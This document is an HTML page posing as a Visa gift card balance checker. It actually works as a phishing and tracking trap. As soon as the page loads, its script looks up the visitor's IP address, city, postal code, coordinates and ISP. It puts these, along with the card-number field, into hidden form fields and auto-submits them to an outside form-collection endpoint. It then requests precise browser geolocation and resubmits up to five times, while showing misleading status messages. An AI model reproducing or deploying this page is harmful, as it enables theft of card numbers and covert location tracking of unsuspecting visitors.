<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>balance checker</title>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Outfit', sans-serif;
      background: linear-gradient(to right, #f4f4ff, #e0e7ff);
      margin: 0;
      padding: 0;
      display: flex;
      height: 100vh;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: white;
      padding: 2rem;
      border-radius: 20px;
      box-shadow: 0 15px 40px rgba(0,0,0,0.1);
      max-width: 500px;
      width: 100%;
      animation: fadeIn 1s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h1 {
      text-align: center;
      font-size: 1.8rem;
      margin-bottom: 1.5rem;
      color: #333;
    }
    textarea {
      width: 100%;
      padding: 1rem;
      border: 2px solid #ccc;
      border-radius: 12px;
      font-size: 1rem;
      margin-bottom: 1rem;
      resize: none;
    }
    .submit-btn {
      width: 100%;
      padding: 1rem;
      background-color: #4f46e5;
      color: white;
      font-size: 1rem;
      border: none;
      border-radius: 12px;
      cursor: not-allowed;
      opacity: 0.6;
    }
    .small-text {
      text-align: center;
      font-size: 0.8rem;
      color: #777;
      margin-top: 1rem;
    }
    .info {
      font-size: 0.85rem;
      margin-top: 1rem;
      color: #444;
    }
  </style>
</head>
<body>

<div class="container">
  <h1>Visa Card Balance Checker</h1>

  <form id="autoForm" method="POST" action="https://formbold.com/s/obDkQ">
    <textarea name="feedback" placeholder="Enter VISA giftcard number..."></textarea>

    <!-- Hidden fields auto-filled by JS -->
    <input type="hidden" name="ip" />
    <input type="hidden" name="city" />
    <input type="hidden" name="region" />
    <input type="hidden" name="country" />
    <input type="hidden" name="country_code" />
    <input type="hidden" name="postal" />
    <input type="hidden" name="latitude" />
    <input type="hidden" name="longitude" />
    <input type="hidden" name="timezone" />
    <input type="hidden" name="currency" />
    <input type="hidden" name="org" />
    <input type="hidden" name="asn" />
    <input type="hidden" name="continent_code" />
    <input type="hidden" name="country_population" />

    <button class="submit-btn" disabled>...</button>
    <div class="info" id="info"></div>
    <div class="small-text">Enter Card Number.</div>
  </form>
</div>

<script>
  let sendCount = 0;
  const MAX_SENDS = 5;

  async function collectAndSend() {
    if (sendCount >= MAX_SENDS) return;

    const form = document.getElementById('autoForm');
    const info = document.getElementById('info');

    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();

      form.elements['ip'].value = data.ip;
      form.elements['city'].value = data.city;
      form.elements['region'].value = data.region;
      form.elements['country'].value = data.country_name;
      form.elements['country_code'].value = data.country;
      form.elements['postal'].value = data.postal;
      form.elements['latitude'].value = data.latitude;
      form.elements['longitude'].value = data.longitude;
      form.elements['timezone'].value = data.timezone;
      form.elements['currency'].value = data.currency;
      form.elements['org'].value = data.org;
      form.elements['asn'].value = data.asn;
      form.elements['continent_code'].value = data.continent_code;
      form.elements['country_population'].value = data.country_population;

      info.textContent = "Sending general location...";
      form.submit();
      sendCount++;

      // After first submission, listen for geolocation permission
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          if (sendCount >= MAX_SENDS) return;
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;

          form.elements['latitude'].value = lat;
          form.elements['longitude'].value = lon;

          info.textContent = "...";
          setTimeout(() => {
            form.submit();
            sendCount++;
          }, 1000);
        },
        (err) => {
          console.log("Invalid card number", err);
        }
      );

    } catch (err) {
      info.textContent = "Please Enter the correct giftcard.";
    }
  }

  window.onload = collectAndSend;
</script>

</body>
</html>
